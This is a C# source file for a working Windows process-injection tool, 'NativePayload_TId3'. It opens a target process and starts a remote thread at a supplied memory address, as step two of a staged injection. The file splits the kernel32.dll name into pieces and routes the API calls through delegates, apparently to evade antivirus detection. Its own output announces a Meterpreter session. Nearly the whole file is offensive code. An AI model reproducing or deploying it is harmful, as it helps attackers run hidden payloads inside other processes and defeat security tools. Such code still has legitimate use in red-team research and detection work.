using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace NativePayload_TId3
{
    class Program
    {
        public class DelCLSInvoke
        {
            [Flags]
            public enum ProcessAccessFlags : uint
            {
                Terminate = 0x00000001,
                CreateThread = 0x00000002,
                VMOperation = 0x00000008,
                VMRead = 0x00000010,
                VMWrite = 0x00000020,
                DupHandle = 0x00000040,
                SetInformation = 0x00000200,
                QueryInformation = 0x00000400,
                Synchronize = 0x00100000,
                All = 0x001F0FFF
            }

            [Flags]
            public enum AllocationType
            {
                Commit = 0x00001000,
                Reserve = 0x00002000,
                Decommit = 0x00004000,
                Release = 0x00008000,
                Reset = 0x00080000,
                TopDown = 0x00100000,
                WriteWatch = 0x00200000,
                Physical = 0x00400000,
                LargePages = 0x20000000
            }

            [Flags]
            public enum MemoryProtection
            {
                NoAccess = 0x0001,
                ReadOnly = 0x0002,
                ReadWrite = 0x0004,
                WriteCopy = 0x0008,
                Execute = 0x0010,
                ExecuteRead = 0x0020,
                ExecuteReadWrite = 0x0040,
                ExecuteWriteCopy = 0x0080,
                GuardModifierflag = 0x0100,
                NoCacheModifierflag = 0x0200,
                WriteCombineModifierflag = 0x0400
            }
            [DllImport("ke" + "rne" + "l" + "32.dll")]
            public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

            [DllImport("kernel32.dll")]
            public static extern bool CloseHandle(IntPtr hObject);

           
            [DllImport("k" + "e" + "r" + "ne" + "l" + "32.dll")]
            public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
           

            public static IntPtr _Step1_(int XprocID)
            {
                int Injection_to_PID = XprocID;
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("[!] Attack Started, Time {0}", DateTime.Now.ToString());
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.Write("[>] Opening Target ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("{0}:{1} ", Process.GetProcessById(Injection_to_PID).ProcessName, Process.GetProcessById(Injection_to_PID).Id.ToString());
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.Write("Process");
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine();
                Console.WriteLine("[!] Target Process Opening Done, Time {0}", DateTime.Now.ToString());
                Console.WriteLine();
               
                IntPtr x = OpenProcess(ProcessAccessFlags.All, false, Injection_to_PID);
                return x;
            }
           
            public static IntPtr _Step4_(IntPtr H, IntPtr HA)
            {
                uint x = 0;
                IntPtr cde = CreateRemoteThread(H, IntPtr.Zero, 0, HA, IntPtr.Zero, 0, out x);
                /// close
                CloseHandle(cde);
                CloseHandle(HA);
                return cde;
            }
        }
        public delegate IntPtr Mydels1and2(int a);       
        public delegate IntPtr Mydels4and4(IntPtr H, IntPtr HA);
        static void Main(string[] args)
        {
            bool delay = false;
            if (Convert.ToInt32(args[0]) > 0)
            { delay = true; }
            else if (args[0].ToUpper() == "0")
            { delay = false; }
                Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_TId3 , Published by Damon Mohammadbagher , May 2020");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_TId3 Thread Injection into Target Process + C# Delegate [Step2]");
            Console.WriteLine();
            Mydels1and2 delstep1 = new Mydels1and2(DelCLSInvoke._Step1_);        
            Mydels4and4 delstep4 = new Mydels4and4(DelCLSInvoke._Step4_);
            Console.WriteLine();

            if (delay)
            {
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine("[!] Steps will run by Delay.({0}).", args[0]);
            }

            if (delay) System.Threading.Thread.Sleep(Convert.ToInt32(args[0]));

            IntPtr H = delstep1.Invoke(Convert.ToInt32(args[1]));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write("Step1 Delegate.Invoke(");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("{0}", H.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write(") Intptr Done.");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" [API::OpenProcess]");
            Console.WriteLine();
            if (delay) System.Threading.Thread.Sleep(Convert.ToInt32(args[0]));

            IntPtr f = delstep4.Invoke(H, ((IntPtr)Convert.ToInt64(args[2], 16)));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write("Step4 Delegate.Invoke(");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("{0}", f.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write(") Intptr Done.");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" [API::CreateRemoteThread]");
            Console.WriteLine();
            Console.WriteLine();

            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Bingo Meterpreter Session by Thread Injection Method + C# Delegate [Step2] ;)");
            Console.WriteLine();
        }
    }
}
